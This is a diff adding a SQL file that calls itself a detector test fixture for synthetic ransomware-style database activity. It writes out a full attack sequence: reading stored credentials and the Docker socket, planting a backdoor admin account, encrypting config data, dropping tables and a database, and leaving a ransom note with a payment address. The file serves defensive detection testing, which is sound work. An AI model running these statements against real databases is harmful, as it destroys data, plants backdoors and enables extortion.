@@ -1,0 +1,17 @@
+-- [DETECTOR TEST FIXTURE] synthetic JADEPUFFER-style database activity.
+-- This is inert text used only to test the defensive detector. Nothing here runs.
+SELECT config_value FROM app_settings WHERE name = 'minio_credentials';
+SELECT LOAD_FILE('/var/run/docker.sock');
+SELECT name, dl FROM mysql.func;
+-- High-ROI databases to drop (data already backed up to staging host)
+INSERT INTO users (username, password, enabled) VALUES ('xadmin', '$2a$10$abcdefghijklmnopqrstuvQ9', 1);
+INSERT INTO roles (username, role) VALUES ('xadmin', 'ROLE_ADMIN');
+CREATE TABLE config_info_enc AS SELECT id, AES_ENCRYPT(content, 'a1b2c3d4-90ef-uuid-key') FROM config_info;
+SET GLOBAL FOREIGN_KEY_CHECKS = 0;
+DROP TABLE config_info;
+DROP TABLE his_config_info;
+-- nacos is the largest - drop it too
+DROP DATABASE nacos;
+SET GLOBAL FOREIGN_KEY_CHECKS = 1;
+CREATE TABLE README_RANSOM (msg TEXT);
+INSERT INTO README_RANSOM (msg) VALUES ('Your data has been encrypted. Pay 0.5 BTC to 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy to recover it. Contact e78393397@proton.me for the decryptor.');
